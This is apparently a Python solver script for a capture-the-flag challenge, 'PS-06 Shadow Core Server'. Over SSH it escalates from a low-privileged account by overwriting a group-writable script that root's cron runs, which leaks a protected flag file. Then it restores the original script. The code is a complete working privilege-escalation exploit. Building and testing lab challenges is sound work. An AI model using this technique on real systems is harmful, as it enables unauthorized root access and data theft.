#!/usr/bin/env python3
"""
PS-06 Shadow Core Server - Automated Solver / Exploit Script
=============================================================

CyberTrace: Project Shadow - Challenge Design B
Author: Zoysa E.R.L (Member 3)

WHAT THIS SCRIPT DOES
----------------------
This script automates the full solve path for the PS-06 "Shadow Core Server"
challenge. It demonstrates, end to end and without any manual steps, how a
low-privileged account (shadowanalyst) can escalate to root by abusing a
group-writable maintenance script that root's crontab executes every minute.

Steps performed automatically:
  1. Connect to the target over SSH as the low-privileged investigator
     account (shadowanalyst).
  2. Enumerate /opt/shadow/maintenance/backup.sh to confirm it is
     group-writable and owned by root.
  3. Overwrite backup.sh with a payload that copies the root-protected
     final_case.txt into a world-readable location.
  4. Wait for root's cron job to execute the modified script
     (cron runs it every minute).
  5. Read back the leaked final_case.txt, which contains the final flag.
  6. Restore the original, harmless script content so the box is left in
     a clean, re-solvable state (acts as part of the reset routine).

USAGE
-----
    python3 ps06_solver.py --host 192.168.128.2 --user shadowanalyst

You will be prompted for the SSH password interactively (so it is never
stored in shell history or in this file).

REQUIREMENTS
------------
    pip install paramiko --break-system-packages
"""

import argparse
import getpass
import sys
import time

try:
    import paramiko
except ImportError:
    print("[!] This script requires the 'paramiko' library.")
    print("    Install it with: pip install paramiko --break-system-packages")
    sys.exit(1)


VULNERABLE_SCRIPT_PATH = "/opt/shadow/maintenance/backup.sh"
PRIVATE_FLAG_FILE = "/opt/shadow/private/final_case.txt"
DROP_DIR = "/var/tmp/shadow-drop"
LEAKED_FLAG_PATH = f"{DROP_DIR}/final_case.txt"

ORIGINAL_SCRIPT_CONTENT = (
    "#!/bin/bash\n"
    'echo "Project Shadow maintenance backup routine"\n'
)

PAYLOAD_SCRIPT_CONTENT = (
    "#!/bin/bash\n"
    f"cp {PRIVATE_FLAG_FILE} {LEAKED_FLAG_PATH}\n"
    f"chmod 644 {LEAKED_FLAG_PATH}\n"
)

CRON_WAIT_SECONDS = 90


def run(ssh_client, command, quiet=False):
    """Run a single command over SSH and return (stdout, stderr, exit_code)."""
    if not quiet:
        print(f"    $ {command}")
    stdin, stdout, stderr = ssh_client.exec_command(command)
    exit_code = stdout.channel.recv_exit_status()
    out = stdout.read().decode(errors="replace").strip()
    err = stderr.read().decode(errors="replace").strip()
    return out, err, exit_code


def write_remote_file(ssh_client, remote_path, content):
    """Write content to a remote file using an SFTP connection."""
    sftp = ssh_client.open_sftp()
    with sftp.file(remote_path, "w") as f:
        f.write(content)
    sftp.chmod(remote_path, 0o775)
    sftp.close()


def main():
    parser = argparse.ArgumentParser(
        description="Automated solver for PS-06 Shadow Core Server (CyberTrace: Project Shadow)."
    )
    parser.add_argument("--host", required=True, help="IP address of shadow-core (e.g. 192.168.128.2)")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("--user", default="shadowanalyst", help="SSH username (default: shadowanalyst)")
    parser.add_argument("--no-restore", action="store_true",
                         help="Do not restore the original script after retrieving the flag")
    args = parser.parse_args()

    password = getpass.getpass(f"SSH password for {args.user}@{args.host}: ")

    print(f"\n[*] Connecting to {args.host}:{args.port} as {args.user} ...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=args.host,
            port=args.port,
            username=args.user,
            password=password,
            timeout=10,
        )
    except Exception as exc:
        print(f"[!] Connection failed: {exc}")
        sys.exit(1)

    print("[+] Connected.\n")

    try:
        # Step 1: confirm identity
        print("[*] Step 1: Confirming identity and group membership")
        out, _, _ = run(client, "id")
        print(f"    {out}\n")

        # Step 2: enumerate the target script
        print("[*] Step 2: Inspecting the maintenance script permissions")
        out, _, _ = run(client, f"ls -l {VULNERABLE_SCRIPT_PATH}")
        print(f"    {out}")
        if "rw" not in out.split()[0][1:4] and "w" not in out.split()[0][4:7]:
            print("[!] Warning: script does not appear group-writable. Continuing anyway.\n")
        else:
            print("[+] Confirmed: script is writable by our group.\n")

        # Step 3: overwrite the script with the malicious payload
        print("[*] Step 3: Overwriting the maintenance script with the exploit payload")
        write_remote_file(client, VULNERABLE_SCRIPT_PATH, PAYLOAD_SCRIPT_CONTENT)
        out, _, _ = run(client, f"cat {VULNERABLE_SCRIPT_PATH}", quiet=True)
        print("    New script content on target:")
        for line in out.splitlines():
            print(f"      {line}")
        print()

        # Step 4: wait for root's cron job to execute it
        print(f"[*] Step 4: Waiting {CRON_WAIT_SECONDS}s for root's scheduled task to run the script ...")
        for remaining in range(CRON_WAIT_SECONDS, 0, -10):
            print(f"    ...{remaining}s remaining")
            time.sleep(min(10, remaining))

        # Step 5: read back the leaked flag file
        print("\n[*] Step 5: Attempting to read the leaked flag file")
        out, err, code = run(client, f"cat {LEAKED_FLAG_PATH}")
        if code != 0 or not out:
            print("[!] Flag file not found yet. Cron may not have fired. "
                  "Try re-running, or increase the wait time.")
            print(f"    stderr: {err}")
        else:
            print("\n" + "=" * 60)
            print(" FLAG RETRIEVED")
            print("=" * 60)
            print(out)
            print("=" * 60 + "\n")

        # Step 6: restore clean state (optional)
        if not args.no_restore:
            print("[*] Step 6: Restoring the original script content (cleanup)")
            write_remote_file(client, VULNERABLE_SCRIPT_PATH, ORIGINAL_SCRIPT_CONTENT)
            run(client, f"rm -f {LEAKED_FLAG_PATH}")
            print("[+] Target restored to clean, re-solvable state.\n")
        else:
            print("[*] Skipping restore (--no-restore passed). Target left in exploited state.\n")

    finally:
        client.close()
        print("[*] SSH connection closed.")


if __name__ == "__main__":
    main()
